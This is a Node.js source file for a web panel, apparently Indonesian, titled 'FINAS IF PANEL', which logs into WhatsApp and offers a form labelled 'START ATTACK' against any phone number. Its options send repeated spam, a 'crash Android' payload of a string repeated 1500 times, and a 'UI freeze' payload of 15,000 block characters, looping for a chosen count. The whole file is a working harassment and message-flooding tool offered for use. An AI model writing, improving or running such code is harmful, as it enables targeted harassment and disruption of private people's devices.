const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
const port = process.env.PORT || 3000;

const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: { 
        headless: true, 
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote', '--single-process', '--disable-gpu'] 
    }
});

client.on('qr', (qr) => {
    console.log('SCAN QR DI LOGS RAILWAY:');
    qrcode.generate(qr, {small: true});
});

client.on('ready', () => {
    console.log('✅ FINAS IF PANEL ONLINE!');
});

// DASHBOARD DENGAN GAMBAR
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <title>FINAS IF PANEL</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #000; color: #ffd700; font-family: 'Arial', sans-serif; text-align: center; padding: 20px; }
                .card { border: 2px solid #ffd700; background: #111; padding: 20px; border-radius: 20px; box-shadow: 0 0 25px #ffd700; max-width: 400px; margin: auto; }
                
                /* STYLE GAMBAR */
                .logo { width: 150px; height: 150px; border-radius: 50%; border: 3px solid #ffd700; margin-bottom: 15px; object-fit: cover; box-shadow: 0 0 15px #ffd700; }
                
                h1 { color: #ffd700; text-shadow: 0 0 10px #ffd700; margin: 5px 0; }
                input, select, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: #fff; font-size: 16px; }
                button { background: #ffd700; color: #000; font-weight: bold; border: none; cursor: pointer; transition: 0.3s; }
                button:hover { background: #fff; transform: scale(1.05); }
            </style>
        </head>
        <body>
            <div class="card">
                <img src="https://telegra.ph/file/0c93c52e612f026a76384.jpg" class="logo" alt="FINAS IF">
                
                <h1>FINAS IF PANEL</h1>
                <p style="color:#888;">STATUS: <span style="color:#00ff00;">READY TO ATTACK</span></p>
                
                <form action="/attack" method="POST">
                    <input type="text" name="number" placeholder="628xxxxxxxxxx" required>
                    <select name="type">
                        <option value="spam">🔥 BRUTAL SPAM</option>
                        <option value="crash">💀 CRASH ANDROID</option>
                        <option value="ui">☣️ UI FREEZE</option>
                    </select>
                    <input type="number" name="count" placeholder="Jumlah Pesan" value="10" required>
                    <button type="submit">START ATTACK</button>
                </form>
            </div>
        </body>
        </html>
    `);
});

app.post('/attack', async (req, res) => {
    const { number, type, count } = req.body;
    const chatId = number + "@c.us";
    let text = "🔥 SPAMMED BY FINAS IF 🔥"; 

    if (type === "crash") text = "Buffer-Crash-".repeat(1500);
    if (type === "ui") text = "░".repeat(15000);

    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(chatId, text);
            await new Promise(r => setTimeout(r, 1000));
        } catch (e) { console.log(e); }
    }
    res.send('<body style="background:#000;color:gold;text-align:center;padding-top:50px;"><h2>Serangan Selesai, Bos!</h2><a href="/" style="color:white;">KEMBALI</a></body>');
});

app.listen(port, '0.0.0.0', () => {
    console.log('Server berjalan di port: ' + port);
});

client.initialize();
